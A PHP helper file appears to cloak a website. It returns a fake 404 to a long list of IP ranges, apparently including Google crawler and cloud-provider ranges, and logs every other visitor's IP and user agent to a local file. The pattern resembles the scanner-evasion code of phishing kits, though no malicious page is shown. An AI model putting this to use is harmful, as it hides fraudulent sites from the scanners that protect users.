<?php

/*
 * Helper functions
 * */

/**
 * Banned IP Addresses
 */
function bannedIPs() {
    // Array's of banned IP addresses
    $bannedIP = [
        "/^69\.164\.(64\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((6[5-9]|[7-9][0-9]|1([0-1][0-9]|2[0-6]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|127\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^5\.62\.(28\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((29|[3-5][0-9]|6[0-2])\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|63\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^35\.((1(8[4-9]|9[0-9])|2([0-3][0-9]|4[0-6]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|247\.0\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^196\.251\.(93\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((9[4-8])\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|99\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^105.187.240.*/", "/^103.210.49.*/", "/^187.94.208.*/", "/^104.196.*.*/", "/^35.184.*.*/", "/^34.230.*.*/", "/^54.90.*.*/",
        "/^208\.117\.(224\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((2(2[5-9]|[3-4][0-9]|5[0-3]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|254\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^66\.102\.(0\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|(([1-9]|1[0-4])\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|15\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^173\.239\.(208\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((2(09|[1-3][0-9]|4[0-6]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|247\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^107\.178\.(192\.([1-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))|((1(9[3-9])|2([0-4][0-9]|5[0-4]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])))|255\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-4])))$/",
        "/^66.102.*.*/", "/^66.249.*.*/", "/^72.14.192.*/", "/^74.125.*.*/", "/^209.85.128.*/", "/^216.239.32.*/", "/^74.125.*.*/",
        "/^207.126.144.*/", "/^173.194.*.*/", "/^64.233.160.*/", "/^72.14.192.*/", "/^66.102.*.*/", "/^64.18.*.*/", "/^194.52.68.*/",
        "/^194.72.238.*/", "/^62.116.207.*/", "/^212.50.193.*/", "/^69.65.*.*/", "/^50.7.*.*/", "/^131.212.*.*/", "/^46.116.*.* /",
        "/^62.90.*.*/", "/^89.138.*.*/", "/^82.166.*.*/", "/^85.64.*.*/", "/^85.250.*.*/", "/^89.138.*.*/", "/^93.172.*.*/",
        "/^109.186.*.*/", "/^194.90.*.*/", "/^212.29.192.*/", "/^212.29.224.*/", "/^212.143.*.*/", "/^212.150.*.*/", "/^212.235.*.*/",
        "/^217.132.*.*/", "/^50.97.*.*/", "/^217.132.*.*/", "/^209.85.*.*/", "/^66.205.64.*/", "/^204.14.48.*/", "/^64.27.2.*/", "/^67.15.*.*/",
        "/^202.108.252.*/", "/^193.47.80.*/", "/^64.62.136.*/", "/^66.221.*.*/", "/^64.62.175.*/", "/^198.54.*.*/", "/^192.115.134.*/",
        "/^216.252.167.*/", "/^193.253.199.*/", "/^69.61.12.*/", "/^64.37.103.*/", "/^38.144.36.*/", "/^64.124.14.*/", "/^206.28.72.*/",
        "/^209.73.228.*/", "/^158.108.*.*/", "/^168.188.*.*/", "/^66.207.120.*/", "/^167.24.*.*/", "/^192.118.48.*/", "/^67.209.128.*/",
        "/^12.148.209.*/", "/^12.148.196.*/", "/^193.220.178.*/", "/68.65.53.71/", "/^198.25.*.*/", "/^64.106.213.*/"
    ];
    // This is for wild card matches
    foreach ($bannedIP as $ip) {
        if (preg_match($ip, $_SERVER['REMOTE_ADDR'])) {
            header('HTTP/1.0 404 Not Found');
            exit();
        }
    }
}

/**
 * Log activity
 * @param string $logfile
 */
function logActivity($logfile = './access.log') {
    $log = "
    IP: ${_SERVER['REMOTE_ADDR']} (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")
    Time: ".date('Y-M-d h:i:sa')."
    User Agent: ${_SERVER['HTTP_USER_AGENT']}
    --------------------------------------------------------------------
    ";

    file_put_contents($logfile, $log, FILE_APPEND);
}
